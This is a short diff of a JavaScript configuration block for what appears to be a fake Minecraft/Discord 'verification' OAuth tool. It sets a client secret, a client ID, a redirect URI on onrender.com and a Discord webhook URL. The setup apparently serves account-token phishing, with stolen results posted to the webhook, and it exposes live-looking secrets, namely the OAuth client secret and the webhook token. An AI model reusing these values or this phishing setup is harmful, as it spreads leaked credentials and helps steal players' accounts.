@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = '-fl8Q~E3fPJhBZPDntZTM4qQv85QGGsMKhxGoaVV' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'c63c5e76-f721-468b-9559-07eecd2a2cf0'
-const redirect_uri = 'https://discord-verification-0zfy.onrender.com'
+const redirect_uri = 'https://minecraft-verification-wwfm.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1273326939569913897/W2PkM0F_7OFzVl0DcWiuyNyXG7X5iBLkfdsp6tmO7-fGqoszatwMFNXI2ujf9qCWamcB'
 
 //Requirements
